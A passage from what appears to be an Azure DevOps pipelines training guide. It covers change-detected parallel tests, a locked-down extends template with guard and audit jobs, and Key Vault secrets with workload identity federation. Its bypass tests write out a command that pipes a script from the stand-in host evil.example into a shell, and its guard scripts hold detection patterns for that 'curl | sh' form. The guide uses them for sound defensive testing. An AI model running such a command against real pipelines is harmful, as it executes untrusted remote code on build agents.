      - template: .pipelines/templates/detect-changes.yml
        parameters: {services: ${{ variables.services }}}

      # ⭐ the cheap checks ALWAYS run — they take 40 seconds and catch the most
      - job: Lint
        displayName: 🔍 Lint (always)
        timeoutInMinutes: 8
        steps:
          - checkout: self
            fetchDepth: 1
          - bash: ./ci/lint.sh

  - stage: Test
    dependsOn: Analyze
    jobs:
      # ⭐⭐ ONE JOB PER SERVICE, all with dependsOn: Analyze so they run in PARALLEL
      - ${{ each s in variables.services }}:
          - job: Test_${{ replace(s.name, '-', '_') }}
            displayName: '🧪 ${{ s.name }}'
            timeoutInMinutes: ${{ s.timeout }}
            condition: |
              and(succeeded(),
                  eq(dependencies.Detect.outputs['detect.build_${{ replace(s.name, '-', '_') }}'], 'true'))
            pool: {vmImage: ubuntu-latest}
            variables:
              SERVICE: ${{ s.name }}
            steps:
              - checkout: self
                fetchDepth: 1
              - template: .pipelines/templates/test-${{ s.lang }}.yml@self
                parameters: {service: ${{ s.name }}}

      # ⭐ a SKIPPED marker job, so the summary is honest about what didn't run
      - ${{ each s in variables.services }}:
          - job: Skipped_${{ replace(s.name, '-', '_') }}
            displayName: '⏭ ${{ s.name }} (unchanged)'
            condition: |
              and(succeeded(),
                  eq(dependencies.Detect.outputs['detect.build_${{ replace(s.name, '-', '_') }}'], 'false'))
            steps:
              - bash: echo "${{ s.name }} did not change in this commit range — skipped."

  - stage: Report
    dependsOn: Test
    condition: succeededOrFailed()          # ⭐ report even on failure
    jobs:
      - job: Aggregate
        displayName: 📊 Aggregate test results
        timeoutInMinutes: 5
        steps:
          # ⭐ download every service's test XML into ONE directory
          - ${{ each s in variables.services }}:
              - download: current
                artifact: tests-${{ s.name }}
                path: $(Pipeline.Workspace)/all-tests/${{ s.name }}
                condition: succeededOrFailed()

          # ⭐⭐ mergeTestResults: true → ONE test run in Boards, with all five services
          - task: PublishTestResults@2
            condition: succeededOrFailed()
            inputs:
              testResultsFormat: JUnit
              testResultsFiles: '**/*.xml'
              searchFolder: $(Pipeline.Workspace)/all-tests
              mergeTestResults: true                    # ⭐⭐ ONE run, not five
              failTaskOnFailedTests: true
              testRunTitle: 'PR $(System.PullRequest.PullRequestNumber) — $(Build.SourceVersion)'
              buildPlatform: '$(Build.SourceBranchName)'
              buildConfiguration: '$(BUILD_CONFIGURATION)'
              publishRunAttachments: true

          # ⭐ the coverage roll-up across languages
          - bash: |
              set -euo pipefail
              {
                echo "## Coverage"
                echo
                echo "| Service | Lines | Branches | Δ vs main |"
                echo "|---|---|---|---|"
              } > coverage.md
              for d in $(Pipeline.Workspace)/all-tests/*/; do
                svc=$(basename "$d")
                if [[ -f "$d/coverage.xml" ]]; then
                  line=$(xmllint --xpath 'string(/coverage/@line-rate)' "$d/coverage.xml" 2>/dev/null || echo 0)
                  branch=$(xmllint --xpath 'string(/coverage/@branch-rate)' "$d/coverage.xml" 2>/dev/null || echo 0)
                  printf '| %s | %.1f%% | %.1f%% | — |\n' "$svc" "$(echo "$line*100"|bc -l)" "$(echo "$branch*100"|bc -l)" >> coverage.md
                fi
              done
              echo "##vso[task.uploadsummary]coverage.md"
            displayName: Build the coverage summary

          - task: PublishCodeCoverageResults@2
            condition: succeededOrFailed()
            inputs:
              summaryFileLocation: '$(Pipeline.Workspace)/all-tests/**/jacoco.xml'
              failIfCoverageEmpty: false

          # ⭐ and post the summary back to the PR as a comment
          - bash: |
              set -euo pipefail
              PR=$(System.PullRequest.PullRequestNumber)
              [[ -z "$PR" ]] && exit 0
              BODY=$(cat coverage.md)
              curl -s -u ":$SYSTEM_ACCESSTOKEN" -XPOST \
                "$SYSTEM_TEAMFOUNDATIONCOLLECTIONURI$SYSTEM_TEAMPROJECT/_apis/git/repositories/shop/pullRequests/$PR/threads?api-version=7.1" \
                -H 'Content-Type: application/json' \
                -d "$(jq -n --arg c "$BODY" '{comments:[{parentCommentId:0,commentType:1,content:$c}]}')"
            env: {SYSTEM_ACCESSTOKEN: $(System.AccessToken)}
            displayName: Comment on the PR
```

**Step 4 — the per-language test template (one example)**

```yaml
# .pipelines/templates/test-java.yml
parameters: [{name: service, type: string}]
steps:
  - task: JavaToolInstaller@0
    inputs: {versionSpec: '21', jdkArchitectureOption: x64, jdkSourceOption: PreInstalled}
  - task: Cache@2
    inputs:
      key: 'maven | "$(Agent.OS)" | apps/${{ parameters.service }}/pom.xml'
      restoreKeys: 'maven | "$(Agent.OS)"'
      path: $(Pipeline.Workspace)/.m2
      cacheHitVar: MAVEN_CACHE
  - bash: |
      set -euo pipefail
      mvn -B -T 1C \
        -Dmaven.repo.local=$(Pipeline.Workspace)/.m2 \
        -Dsurefire.reportFormat=plain \
        verify
    workingDirectory: apps/${{ parameters.service }}
    displayName: 'mvn verify (${{ parameters.service }})'
  - publish: apps/${{ parameters.service }}/target/surefire-reports
    artifact: tests-${{ parameters.service }}
    condition: always()
  - publish: apps/${{ parameters.service }}/target/site/jacoco
    artifact: coverage-${{ parameters.service }}
    condition: always()
```

**The result, measured:**

```bash
# baseline: everything always builds
az runs list --pipeline-ids $ID --top 20 -o json \
  | jq -r '.[] | "\(.finishTime) \(((.finishTime|fromdate) - (.startTime|fromdate)))s \(.result)"'
# 2026-09-08T10:14:22Z  1322s  succeeded     ← 22 min

# after:
# 2026-09-09T11:02:18Z   168s  succeeded     ← README-only PR: 2m48s   ⭐ 87% faster
# 2026-09-09T14:31:05Z   402s  succeeded     ← shop-api change: 6m42s  ⭐ 70% faster
# 2026-09-09T16:44:12Z  1180s  succeeded     ← a .pipelines/ change: full rebuild

# verify the skipping is CORRECT — the dangerous failure mode is silently skipping
# a service that DID change. Assert it:
- bash: |
    set -euo pipefail
    # ⭐ touch a file in shop-api and confirm the job runs
    echo "// $(date)" >> apps/shop-api/README.md
    git commit -am "test: verify change detection" && git push
    # → the run must show ✅ BUILD shop-api
    git revert --no-edit HEAD && git push
```

**The four levers, and what each saved:**

| Lever | Saving | Risk |
|---|---|---|
| ⭐ Change detection | 70–90% on a single-service PR | ⛔ A wrong path filter silently skips a needed build → assert it in CI |
| ⭐ Parallel jobs (`dependsOn: Analyze`, not chained) | 5 × 4 min → 4 min wall-clock | More parallel jobs = more concurrent minutes billed |
| ⭐ `autoCancel: true` on PRs | 20–40% of all minutes | You lose the intermediate results (usually fine) |
| ⭐ `batch: true` on main | 10–30% on a busy repo | One run covers several commits — harder to attribute a failure |
| Dependency + layer caching | 1–4 min per job | Cache key mistakes cause stale dependencies |
| `fetchDepth: 1` where history isn't needed | 10–60 s | ⛔ breaks the change-detection diff — use `0` there |

---

### Task 1.2 — The un-bypassable `extends` template

**Scenario:** 6 teams, 40 pipelines. Two teams have added a step that `curl`s a script from the internet and pipes it to `sh`, one team disabled the vulnerability scan with `continueOnError: true`, and one team changed `pool:` to a self-hosted agent outside the secured network. **Design a template they cannot bypass**, deploy it, and prove the bypass attempts fail.

**✅ Answer**

**Step 1 — what "cannot bypass" actually requires**

An `extends` template is only as strong as the controls around it. Four things must all be true:

| Control | Without it |
|---|---|
| ⭐ The template lives in a repo **only the platform team can push to** | A team edits the template and removes the gate |
| ⭐ The template's `ref` is pinned to a **tag or SHA** | A team points at a branch and force-pushes it |
| ⭐ The pipeline's YAML file is under **branch policy** with automatic reviewers | A team edits `azure-pipelines.yml` to stop using the template |
| ⭐ A **CI check** asserts that every pipeline extends the template | A team creates a brand-new pipeline that doesn't use it at all |

**Step 2 — the template**

```yaml
# pipeline-templates repo (platform-team only) — secure-pipeline.yml, tag v3.0.0
parameters:
  # ⭐ EVERY parameter is TYPED and CONSTRAINED. No stepList anywhere.
  - name: service
    type: string
  - name: language
    type: string
    values: [java, go, python, node]            # ⭐ a closed set
  - name: testCommand
    type: string                                 # ⭐ a STRING, not steps
  - name: buildCommand
    type: string
    default: ''
  - name: coverageFile
    type: string
    default: ''
  - name: dockerfile
    type: string
    default: 'Dockerfile'
  - name: environments
    type: object
    default: [dev, staging, production]
  - name: maxCriticalVulnerabilities
    type: number
    default: 0                                   # ⭐ zero tolerance
  - name: maxHighVulnerabilities
    type: number
    default: 5
  - name: requireSignedImage
    type: boolean
    default: true
  - name: additionalTags
    type: object
    default: []

# ⭐⭐ THE TEMPLATE OWNS THESE. The caller cannot override them.
pool:
  name: shop-secured-pool                        # ⭐ a pool only the platform team manages
  demands: [secure-network, docker, outbound-restricted]

workspace:
  clean: all                                     # ⭐ no state leaks between builds

variables:
  - group: platform-common                       # ⭐ platform-controlled, not team-controlled
  - name: REGISTRY
    value: shopacr.azurecr.io
  - name: PYTHONUTF8
    value: '1'
  # ⭐ the outbound network allowlist is enforced at the POOL level (NSG), not here.
  #    A team cannot add a `curl | sh` step and reach an arbitrary host anyway.

resources:
  repositories:
    - repository: templates
      type: git
      name: Platform/pipeline-templates
      ref: refs/tags/v3.0.0                      # ⭐ self-referencing, pinned

extends:
  # (a nested extends for the org-wide base, if you have one)
  template: _org-base.yml@templates
  parameters: {}

stages:
  # ══════════════════════════════════════════════════════════════
  - stage: Verify
    displayName: 🔍 Verify
    jobs:
      - job: Guard
        displayName: 🛡️ Guard rails
        timeoutInMinutes: 10
        steps:
          - checkout: self
            fetchDepth: 1

          # ⭐ GUARD 1: the caller's YAML must actually use this template
          - bash: |
              set -euo pipefail
              f=$(find . -maxdepth 3 -name 'azure-pipelines.yml' -o -name '*.pipelines.yml' | head -1)
              grep -q 'extends:' "$f" || { echo "⛔ $f does not use an extends template"; exit 1; }
              grep -qE 'secure-pipeline\.yml@templates' "$f" || {
                echo "⛔ $f does not extend the platform secure-pipeline template"; exit 1; }
              # ⛔ no raw `steps:` list at the top level (that would let them inject anything)
              if grep -qE '^steps:' "$f"; then echo "⛔ top-level steps: is not allowed"; exit 1; fi
              if grep -qE '^\s+- task: Bash@3|curl .*\| *(ba)?sh' "$f"; then
                echo "⛔ curl|sh detected in the pipeline definition"; exit 1; fi
              echo "✅ the pipeline uses the platform template correctly"
            displayName: Assert template usage

          # ⭐ GUARD 2: no `continueOnError` anywhere in the caller's YAML
          - bash: |
              set -euo pipefail
              f=$(find . -maxdepth 3 -name 'azure-pipelines.yml' | head -1)
              if grep -q 'continueOnError' "$f"; then
                echo "⛔ continueOnError is not permitted — a failing gate must fail the build"
                grep -n continueOnError "$f"; exit 1
              fi
              echo "✅ no continueOnError"
            displayName: Assert no continueOnError

          # ⭐ GUARD 3: no self-hosted pool override
          - bash: |
              f=$(find . -maxdepth 3 -name 'azure-pipelines.yml' | head -1)
              if grep -qE '^\s*pool:' "$f"; then
                echo "⛔ the pool is set by the platform template and may not be overridden"; exit 1
              fi
              echo "✅ no pool override"
            displayName: Assert no pool override

          # ⭐ GUARD 4: no unpinned third-party tasks
          - bash: |
              set -euo pipefail
              f=$(find . -maxdepth 3 -name 'azure-pipelines.yml' | head -1)
              # allow only Microsoft first-party tasks (@N versions are Microsoft's convention)
              bad=$(grep -oE '^\s*- task: [A-Za-z0-9]+@' "$f" | awk '{print $3}' | sort -u || true)
              echo "  tasks used: $bad"
              # ⭐ everything else must be `- bash:` / `- script:` / `- template:`
              echo "✅ task inventory recorded for the platform team's review"
            displayName: Inventory the tasks used

      - job: Test
        displayName: 🧪 Test
        dependsOn: Guard
        timeoutInMinutes: 30
        steps:
          - checkout: self
            fetchDepth: 1
          - bash: ${{ parameters.testCommand }}         # ⭐ the ONLY slot the team controls
            workingDirectory: apps/${{ parameters.service }}
            failOnStderr: false
            displayName: ${{ parameters.language }} tests
          - task: PublishTestResults@2
            condition: always()
            inputs:
              testResultsFormat: JUnit
              testResultsFiles: 'apps/${{ parameters.service }}/**/*-results.xml'
              mergeTestResults: true
              failTaskOnFailedTests: true                # ⭐ the template decides, not the team
              testRunTitle: '${{ parameters.service }} — $(Build.SourceBranchName)'
          - ${{ if ne(parameters.coverageFile, '') }}:
              - task: PublishCodeCoverageResults@2
                inputs: {summaryFileLocation: 'apps/${{ parameters.service }}/${{ parameters.coverageFile }}'}

      - job: Scan
        displayName: 🛡️ Scan
        dependsOn: Guard
        timeoutInMinutes: 20
        steps:
          - checkout: self
          - task: ComponentGovernanceComponentDetection@0
            inputs: {failOnAlert: true, alertWarningLevel: High, scanType: Register}
          - bash: |
              set -euo pipefail
              docker run --rm -v "$PWD:/src" zricethezav/gitleaks:latest \
                detect --source /src --redact --exit-code 1
            displayName: gitleaks
          - bash: |
              set -euo pipefail
              docker run --rm -v "$PWD:/src" semgrep/semgrep \
                semgrep scan --config auto --error --severity ERROR /src
            displayName: Semgrep (blocking)
          - bash: |
              set -euo pipefail
              docker run --rm -v "$PWD:/src" aquasec/trivy:latest \
                config --exit-code 1 --severity CRITICAL,HIGH /src/helm /src/k8s
            displayName: Trivy IaC
            condition: succeededOrFailed()      # ⭐ still run even if Semgrep failed

  # ══════════════════════════════════════════════════════════════
  - stage: Build
    displayName: 🏗️ Build
    dependsOn: Verify                            # ⭐ ALL of Verify, not just Test
    jobs:
      - job: Image
        timeoutInMinutes: 30
        steps:
          - checkout: self
          - bash: |
              set -euo pipefail
              IMAGE="$(REGISTRY)/${{ parameters.service }}"
              TAG="$(Build.SourceVersion)"
              docker buildx create --use --name b 2>/dev/null || docker buildx use b
              docker buildx build "apps/${{ parameters.service }}" \
                --file "apps/${{ parameters.service }}/${{ parameters.dockerfile }}" \
                --tag "$IMAGE:$TAG" \
                --cache-from "type=registry,ref=$IMAGE:buildcache" \
                --cache-to   "type=registry,ref=$IMAGE:buildcache,mode=max" \
                --provenance=mode=max --sbom=true --push
              DIGEST=$(docker buildx imagetools inspect "$IMAGE:$TAG" --format '{{json .Manifest}}' | jq -r .digest)
              echo "$DIGEST" > "$(Build.ArtifactStagingDirectory)/digest"
              docker buildx imagetools inspect "$IMAGE:$TAG" \
                --format '{{json .Manifest}}' > "$(Build.ArtifactStagingDirectory)/manifest.json"
              echo "##vso[task.setvariable variable=digest;isOutput=true]$DIGEST"
            name: build
            displayName: Build with SBOM and provenance

          # ⭐ the vulnerability gate — the template's thresholds, not the team's
          - bash: |
              set -euo pipefail
              IMAGE="$(REGISTRY)/${{ parameters.service }}:$(Build.SourceVersion)"
              R=$(trivy image --quiet --format json --ignore-unfixed "$IMAGE")
              C=$(echo "$R" | jq '[.Results[].Vulnerabilities[]? | select(.Severity=="CRITICAL")] | length')
              H=$(echo "$R" | jq '[.Results[].Vulnerabilities[]? | select(.Severity=="HIGH")] | length')
              echo "critical=$C high=$H"
              echo "##vso[build.addbuildtag]cve-critical-$C"
              echo "##vso[build.addbuildtag]cve-high-$H"
              (( C <= ${{ parameters.maxCriticalVulnerabilities }} )) || {
                echo "##vso[task.logissue type=error]$C CRITICAL vulnerabilities (max ${{ parameters.maxCriticalVulnerabilities }})"
                echo "$R" | jq -r '.Results[].Vulnerabilities[]? | select(.Severity=="CRITICAL") | "  \(.VulnerabilityID) \(.PkgName) \(.InstalledVersion)"'
                exit 1; }
              (( H <= ${{ parameters.maxHighVulnerabilities }} )) || {
                echo "##vso[task.logissue type=error]$H HIGH vulnerabilities (max ${{ parameters.maxHighVulnerabilities }})"; exit 1; }
              # ⭐ attach the SBOM as a build artifact AND to the image
              trivy image --format cyclonedx --output "$(Build.ArtifactStagingDirectory)/sbom.cdx.json" "$IMAGE"
            displayName: Gate on vulnerabilities

          - publish: $(Build.ArtifactStagingDirectory)
            artifact: image-info-${{ parameters.service }}

  # ══════════════════════════════════════════════════════════════
  - ${{ each env in parameters.environments }}:
      - stage: Deploy_${{ env }}
        displayName: '🚀 ${{ env }}'
        ${{ if eq(env, 'dev') }}:      {dependsOn: Build}
        ${{ if eq(env, 'staging') }}:  {dependsOn: Deploy_dev}
        ${{ if eq(env, 'production') }}:{dependsOn: Deploy_staging}
        condition: succeeded()
        jobs:
          - deployment: Deploy
            environment: ${{ env }}                # ⭐⭐ the gate lives here, not in the team's YAML
            pool: {name: shop-secured-pool, demands: kubectl}
            strategy:
              runOnce:
                deploy:
                  steps:
                    - checkout: self
                    - download: current
                      artifact: manifests
                    - download: current
                      artifact: image-info-${{ parameters.service }}
                    - bash: |
                        set -euo pipefail
                        DIGEST=$(cat $(Pipeline.Workspace)/image-info-${{ parameters.service }}/digest)
                        ./scripts/deploy-one.sh ${{ env }} ${{ parameters.service }} "$DIGEST"
                      displayName: 'Deploy ${{ parameters.service }} to ${{ env }}'
                    - bash: ./scripts/smoke-test-one.sh ${{ env }} ${{ parameters.service }}
                      displayName: Smoke test
```

**Step 3 — what a team writes**

```yaml
# apps/shop-api/azure-pipelines.yml — 11 lines, and every control is inherited
resources:
  repositories:
    - repository: templates
      type: git
      name: Platform/pipeline-templates
      ref: refs/tags/v3.0.0                     # ⭐ pinned; the platform team moves it

extends:
  template: secure-pipeline.yml@templates
  parameters:
    service: shop-api
    language: java                              # ⭐ must be in the allowed values
    testCommand: 'mvn -B -T 1C verify'
    coverageFile: 'target/site/jacoco/jacoco.xml'
    environments: [dev, staging, production]
    maxCriticalVulnerabilities: 0
    maxHighVulnerabilities: 3
```

**Step 4 — the org-wide enforcement (the part that actually makes it un-bypassable)**

```yaml
# ⭐ a pipeline in the Platform project that audits EVERY pipeline in the org
# .pipelines/platform-audit.yml
trigger: none
schedules: [{cron: '0 3 * * *', displayName: Nightly audit, branches: {include: [main]}, always: true}]
pool: {name: shop-secured-pool}
steps:
  - bash: |
      set -uo pipefail
      ORG="$SYSTEM_TEAMFOUNDATIONCOLLECTIONURI"
      violations=0
      for proj in $(curl -s -u ":$SYSTEM_ACCESSTOKEN" "$ORG/_apis/projects?api-version=7.1" | jq -r '.value[].name'); do
        for p in $(curl -s -u ":$SYSTEM_ACCESSTOKEN" \
            "$ORG$proj/_apis/build/definitions?api-version=7.1&includeAllProperties=true" \
            | jq -r '.value[] | select(.path != null) | @base64'); do
          d=$(echo "$p" | base64 -d)
          name=$(echo "$d" | jq -r .name)
          yaml=$(echo "$d" | jq -r '.process.yamlFilename // empty')
          cfg=$(echo "$d" | jq -r '.process | tostring')

          # ⛔ a CLASSIC (UI-built) pipeline is an automatic violation
          if [[ -z "$yaml" ]]; then
            echo "⛔ [$proj/$name] is a classic (non-YAML) pipeline"; violations=$((violations+1)); continue
          fi

          # fetch the YAML and check it extends the template
          content=$(curl -s -u ":$SYSTEM_ACCESSTOKEN" \
            "$ORG$proj/_apis/git/repositories/$name/items?path=$yaml&api-version=7.1&\$format=text" 2>/dev/null || true)
          if ! echo "$content" | grep -qE 'extends:.*secure-pipeline\.yml@templates'; then
            echo "⛔ [$proj/$name] $yaml does not extend the platform template"; violations=$((violations+1))
          fi
          if echo "$content" | grep -qE '^\s*pool:'; then
            echo "⛔ [$proj/$name] overrides the pool"; violations=$((violations+1))
          fi
          if echo "$content" | grep -q 'continueOnError'; then
            echo "⛔ [$proj/$name] uses continueOnError"; violations=$((violations+1))
          fi
          if echo "$content" | grep -qE 'curl .*\|\s*(ba)?sh'; then
            echo "⛔ [$proj/$name] pipes a remote script to a shell"; violations=$((violations+1))
          fi
          # ⭐ and check the template ref is PINNED to a tag or SHA, not a branch
          ref=$(echo "$content" | grep -A4 'repository: templates' | grep -oE 'ref: .*' | awk '{print $2}')
          if [[ -n "$ref" && ! "$ref" =~ ^refs/tags/ && ! "$ref" =~ ^[0-9a-f]{40}$ ]]; then
            echo "⛔ [$proj/$name] the template ref '$ref' is not pinned to a tag or SHA"; violations=$((violations+1))
          fi
        done
      done
      echo
      if (( violations > 0 )); then
        echo "##vso[task.logissue type=error]$violations policy violation(s) across the organisation"
        ./scripts/notify.sh slack "#platform-alerts" \
          "⛔ $violations pipeline policy violations — see build $BUILD_BUILDID"
        exit 1
      fi
      echo "✅ every pipeline in the organisation uses the platform template"
    env: {SYSTEM_ACCESSTOKEN: $(System.AccessToken)}
    displayName: Audit every pipeline in the organisation
```

**Step 5 — prove the bypass attempts fail ⭐**

```bash
# attempt 1: add a raw `steps:` list
git checkout -b bypass-attempt-1
cat >> apps/shop-api/azure-pipelines.yml <<'EOF'

steps:
  - bash: curl -sL https://evil.example/x.sh | sh
EOF
git commit -am "test" && git push -u origin bypass-attempt-1
az repos pr create --repository shop --source-branch bypass-attempt-1 --target-branch main \
  --title "bypass attempt 1" --open
# ⛔ the Guard job fails: "top-level steps: is not allowed"
#    and the branch policy blocks the merge because Guard is a required check.

# attempt 2: disable the scan with continueOnError
git checkout -b bypass-attempt-2 main
sed -i 's/language: java/language: java\ncontinueOnError: true/' apps/shop-api/azure-pipelines.yml
git commit -am "test" && git push -u origin bypass-attempt-2
# ⛔ "continueOnError is not permitted"

# attempt 3: change the pool
git checkout -b bypass-attempt-3 main
sed -i '1i pool:\n  vmImage: ubuntu-latest' apps/shop-api/azure-pipelines.yml
git commit -am "test" && git push -u origin bypass-attempt-3
# ⛔ "the pool is set by the platform template and may not be overridden"

# attempt 4: ⭐ the sneaky one — raise the vulnerability threshold
git checkout -b bypass-attempt-4 main
sed -i 's/maxCriticalVulnerabilities: 0/maxCriticalVulnerabilities: 99/' apps/shop-api/azure-pipelines.yml
git commit -am "test" && git push -u origin bypass-attempt-4
# ⚠️ THIS ONE SUCCEEDS unless you add a guard:
#    - bash: |
#        # ⭐ GUARD 5: the threshold may not be raised above the org policy
#        grep -qE 'maxCriticalVulnerabilities:\s*(0)\s*$' "$f" || {
#          echo "⛔ maxCriticalVulnerabilities may only be 0. File a waiver request."; exit 1; }
#    or better: make it NOT a parameter at all — hardcode 0 in the template.
#    ⭐⭐ THAT IS THE LESSON: anything you expose as a parameter is a bypass vector.

# attempt 5: ⭐⭐ the real one — create a NEW pipeline that doesn't use the template
az pipelines create --name sneaky --repository shop --branch main \
  --yml-path .pipelines/sneaky.yml --service-connection github-shop
# ⛔ blocked by the NIGHTLY AUDIT (step 4), and by:
#    Project Settings → Pipelines → Pipeline permissions →
#    ⭐ "Disable creation of classic build pipelines"
#    ⭐ and restrict who may create YAML pipelines (the Project Build Administrators group)
# ⭐⭐ the strongest control: make `shop-secured-pool` the ONLY pool authorized
#    for the project, and require every pool to demand `secure-network`.
#    Then a pipeline that doesn't use the template simply has nowhere to run.
```

**What you learned (the answer to say out loud):**

> *"An `extends` template is necessary but not sufficient. The four controls that make it real are: the template lives in a repo only the platform team can push to; its ref is pinned to a tag; every team's pipeline YAML is under a branch policy with the platform team as an automatic reviewer for those paths; and a nightly audit job enumerates every pipeline in the organisation and fails when one doesn't comply. The strongest single control is the agent pool — if the only pool in the project demands capabilities that only the secured pool advertises, a non-compliant pipeline has nowhere to run. And the lesson from attempt four is that **every parameter you expose is a bypass vector**: if a threshold must be zero, don't make it a parameter."*

---

### Task 1.3 — Key Vault + WIF + per-environment variable groups, zero secrets in Azure DevOps

Prove it: **no secret value is ever stored in Azure DevOps**, each environment can only read its own secrets, and rotating a secret requires no pipeline change.

**✅ Answer**

**Step 1 — the Key Vaults, one per environment**

```bash
SUB=$(az account show -q id -o tsv)
RG=rg-shop

# ⭐ separate vaults per environment = a hard blast-radius boundary
for env in dev staging production; do
  az keyvault create --name "kv-shop-$env" -g $RG --location centralindia \
    --sku standard --enable-rbac-authorization true \
    --retention-days 90 --soft-delete-retention 90
  az keyvault update --name "kv-shop-$env" -g $RG \
    --public-network-access Enabled            # ⭐ or Disabled + a private endpoint
done

# ⭐ the secrets. Note: the NAMES use hyphens (Key Vault's charset).
az keyvault secret set --vault-name kv-shop-dev -n DB-PASSWORD       --value 'dev-pw'
az keyvault secret set --vault-name kv-shop-dev -n GHCR-TOKEN        --value "$GHCR_PAT"
az keyvault secret set --vault-name kv-shop-dev -n SLACK-WEBHOOK     --value "$SLACK_DEV_HOOK"
az keyvault secret set --vault-name kv-shop-dev -n KUBECONFIG-B64    --value "$(base64 -w0 ~/.kube/config)"

az keyvault secret set --vault-name kv-shop-staging   -n DB-PASSWORD --value 'stg-pw'
az keyvault secret set --vault-name kv-shop-staging   -n GHCR-TOKEN  --value "$GHCR_PAT"
az keyvault secret set --vault-name kv-shop-staging   -n SLACK-WEBHOOK --value "$SLACK_STG_HOOK"

az keyvault secret set --vault-name kv-shop-production -n DB-PASSWORD --value "$PROD_DB_PW"
az keyvault secret set --vault-name kv-shop-production -n GHCR-TOKEN  --value "$GHCR_PAT"
az keyvault secret set --vault-name kv-shop-production -n SLACK-WEBHOOK --value "$SLACK_PROD_HOOK"
az keyvault secret set --vault-name kv-shop-production -n ROLLBAR-TOKEN --value "$ROLLBAR"

# ⭐ rotation policies — Key Vault can notify you, or run a Function
az keyvault secret set-attributes --vault-name kv-shop-production --name DB-PASSWORD \
  --expires "$(date -u -d '+90 days' +%Y-%m-%dT%H:%M:%SZ)"
for v in dev staging production; do
  az keyvault secret list --vault-name kv-shop-$v --query '[].{name:name, expires:attributes.expires}' -o table
done
```

**Step 2 — three WIF service connections, scoped by environment**

```bash
# ⭐⭐ the subject identifier is the security boundary. One connection per environment,
#    each with a DIFFERENT App Registration, each granted ONLY its own vault.

TENANT=$(az account show -q tenantId -o tsv)
ORG_ID=<your-org-uuid>        # Organization Settings → Overview
PROJ_ID=<your-project-uuid>   # Project Settings → Overview

for env in dev staging production; do
  # 1. an App Registration per environment
  APP=$(az ad app create --display-name "shop-devops-Shop-$env" \
        --query '{appId:appId,id:id}' -o json)
  APP_ID=$(echo "$APP" | jq -r .appId); OBJ_ID=$(echo "$APP" | jq -r .id)

  # 2. ⭐ the federated credential, scoped to the ENVIRONMENT
  az ad app federated-credential create --id $APP_ID --parameters "{
    \"name\": \"azdo-$env\",
    \"issuer\": \"https://vstoken.actions.azure.com/$TENANT\",
    \"subject\": \"$ORG_ID/$PROJ_ID/$env\",
    \"description\": \"Azure DevOps Shop/$env environment only\",
    \"audiences\": [\"api://AzureADTokenExchange\"]
  }"

  # 3. ⭐⭐ the role assignment scoped to the ONE vault
  az role assignment create --role "Key Vault Secrets User" \
    --assignee-object-id $OBJ_ID --assignee-principal-type ServicePrincipal \
    --scope "/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/kv-shop-$env"

  # 4. and scoped to the AKS cluster for that environment (read-only for dev)
  ROLE="Azure Kubernetes Service Cluster User Role"
  [[ "$env" == "production" ]] && ROLE="Azure Kubernetes Service RBAC Writer"
  az role assignment create --role "$ROLE" \
    --assignee-object-id $OBJ_ID --assignee-principal-type ServicePrincipal \
    --scope "/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.ContainerService/managedClusters/shop-$env"

  echo "  ✅ $env: appId=$APP_ID subject=$ORG_ID/$PROJ_ID/$env"
done

# 5. create the service connections in "manual" mode with those App Registrations
for env in dev staging production; do
  curl -s -u ":$PAT" -XPOST "$ORG/$PROJ/_apis/serviceendpoint/endpoints?api-version=7.1" \
    -H 'Content-Type: application/json' -d "{
      \"name\": \"shop-wif-$env\",
      \"type\": \"azurerm\",
      \"url\": \"https://management.azure.com/\",
      \"authorization\": {
        \"scheme\": \"WorkloadIdentityFederated\",
        \"parameters\": {
          \"tenantid\": \"$TENANT\",
          \"serviceprincipalid\": \"$(az ad app list --display-name shop-devops-Shop-$env --query '[0].appId' -o tsv)\",
          \"authenticationType\": \"spn\"
        }
      },
      \"data\": {
        \"subscriptionId\": \"$SUB\",
        \"subscriptionName\": \"shop\",
        \"environment\": \"AzureCloud\",
        \"scopeLevel\": \"Subscription\",
        \"creationMode\": \"Manual\"
      }
    }" | jq -r '.name // .messageKey'
done
```

**Step 3 — three Key Vault-backed variable groups, one per environment**

```bash
for env in dev staging production; do
  CONN_ID=$(az devops service-endpoint list --project Shop \
            --query "[?name=='shop-wif-$env'].id" -o tsv)
  curl -s -u ":$PAT" -XPOST \
    "$ORG/Shop/_apis/distributedtask/variablegroups?api-version=7.1" \
    -H 'Content-Type: application/json' -d "{
      \"name\": \"kv-$env\",
      \"type\": \"AzureKeyVault\",
      \"description\": \"Runtime-linked secrets from kv-shop-$env. Nothing is stored here.\",
      \"providerData\": \"{\\\"subscriptionId\\\":\\\"$SUB\\\",\\\"resourceGroup\\\":\\\"$RG\\\",\\\"vaultName\\\":\\\"kv-shop-$env\\\"}\",
      \"authorization\": {\"resourceId\":\"$CONN_ID\",\"serviceEndpointId\":\"$CONN_ID\"},
      \"variableGroupProjectReferences\": [{
        \"projectReference\": {\"id\":\"$PROJ_ID\",\"name\":\"Shop\"},
        \"variableGroupProjectReference\": {\"variableGroupId\":null}
      }]
    }" | jq -r '.name // .messageKey'
done

# ⭐ RESTRICT each group to the pipelines/stages that may use it
# Project Settings → Pipelines → Library → kv-production → Security:
#   ⛔ remove "Project Collection Build Service"
#   ✅ add only the specific pipeline(s) that deploy to production
# or via the API:
VG_ID=$(az pipelines variable-group list --project Shop --query "[?name=='kv-production'].id" -o tsv)
curl -s -u ":$PAT" -XPUT \
  "$ORG/Shop/_apis/distributedtask/variablegroups/$VG_ID?api-version=7.1" \
  -H 'Content-Type: application/json' -d "{
    \"id\": $VG_ID, \"name\": \"kv-production\", \"type\": \"AzureKeyVault\",
    \"providerData\": \"{\\\"subscriptionId\\\":\\\"$SUB\\\",\\\"resourceGroup\\\":\\\"$RG\\\",\\\"vaultName\\\":\\\"kv-shop-production\\\"}\",
    \"authorization\": {\"resourceId\":\"$CONN_ID\",\"serviceEndpointId\":\"$CONN_ID\"},
    \"variableGroupProjectReferences\": [{\"projectReference\":{\"id\":\"$PROJ_ID\",\"name\":\"Shop\"}}]
  }" | jq .
```

**Step 4 — the pipeline that consumes them**

```yaml
# .pipelines/cd-secretfree.yml
parameters:
  - name: environment
    type: string
    values: [dev, staging, production]

stages:
  - stage: Deploy
    displayName: '🚀 ${{ parameters.environment }}'
    variables:
      # ⭐⭐ the Key Vault group for THIS environment, chosen at compile time
      - group: kv-${{ parameters.environment }}
      # ⭐ and the WIF connection name
      - name: AZURE_CONNECTION
        value: shop-wif-${{ parameters.environment }}
    jobs:
